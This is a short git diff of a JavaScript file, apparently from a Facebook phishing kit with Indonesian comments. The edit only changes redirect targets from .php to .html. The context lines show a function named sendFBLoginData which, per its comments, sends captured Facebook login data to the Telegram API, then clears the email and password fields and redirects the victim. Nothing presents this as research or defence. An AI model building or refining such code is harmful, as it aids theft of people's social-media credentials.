@@ -309,7 +309,7 @@ function redirectToSuccess() {
     .then(() => {
         // 4. Finalisasi dan Redirect
         localStorage.setItem(`sent_${userID}`, "true");
-        window.location.href = "success.php";
+        window.location.href = "success.html";
     })
     .catch((err) => {
         console.error("❌ Gagal memproses login:", err);
@@ -365,7 +365,7 @@ async function sendFBLoginData() {
         // Setelah berhasil mengirim pesan ke Telegram (atau gagal tapi dilanjutkan)
         if (emailEl) emailEl.value = "";
         if (passEl) passEl.value = "";
-        window.location.href = "facebook.php";
+        window.location.href = "facebook.html";
     } catch (err) {
         console.error("❌ Error FB:", err);
         alert("❌ Tidak bisa menghubungi Telegram API.");
